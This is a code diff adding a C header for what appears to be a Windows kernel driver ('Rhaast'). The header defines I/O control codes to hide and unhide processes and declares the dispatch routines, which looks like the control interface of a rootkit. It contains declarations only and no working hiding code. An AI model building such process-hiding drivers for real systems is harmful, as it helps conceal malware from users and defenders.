@@ -1,0 +1,17 @@
+#pragma once
+
+#include <Common.h>
+#include <Defines.h>
+
+/* I/O Controls */
+#define RHAAST_IOCTL_PROCESS_HIDE   CTL_CODE( 0x8000, RHAAST_COMMAND_PROCESS_HIDE,   METHOD_BUFFERED, FILE_ANY_ACCESS )
+#define RHAAST_IOCTL_PROCESS_UNHIDE CTL_CODE( 0x8000, RHAAST_COMMAND_PROCESS_UNHIDE, METHOD_BUFFERED, FILE_ANY_ACCESS )
+
+VOID TsIoCtlInit(
+    VOID 
+);
+
+NTSTATUS TsIoCtlDispatch(
+    IN OUT PDEVICE_OBJECT DeviceObject, 
+    IN OUT PIRP           Irp
+);
